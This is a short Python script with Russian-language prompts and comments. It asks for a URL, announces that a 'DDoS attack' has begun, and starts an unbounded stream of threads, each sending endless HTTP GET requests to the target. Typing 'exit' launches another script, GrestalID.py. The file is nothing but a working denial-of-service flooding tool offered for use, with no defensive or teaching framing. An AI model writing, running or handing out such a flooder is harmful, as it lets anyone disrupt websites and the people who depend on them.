import threading
import requests
import time
import subprocess  # Импорт модуля для запуска другого скрипта

# Импорт модулей для работы с цветом текста
from colorama import init, Fore, Style

# Инициализация colorama для поддержки ANSI Escape Sequences в Windows
init()

print(Fore.BLUE + "Введите ссылку" + Style.RESET_ALL)
link = input(': ')
time.sleep(1)
print(Fore.BLUE + "Ddos Атака началась" + Style.RESET_ALL)
def ddos():
    while True:
        requests.get(link)

while True:
    threading.Thread(target=ddos).start()
    command = input()
    if command.lower() == 'exit':
        subprocess.run(['python', 'GrestalID.py'])
        break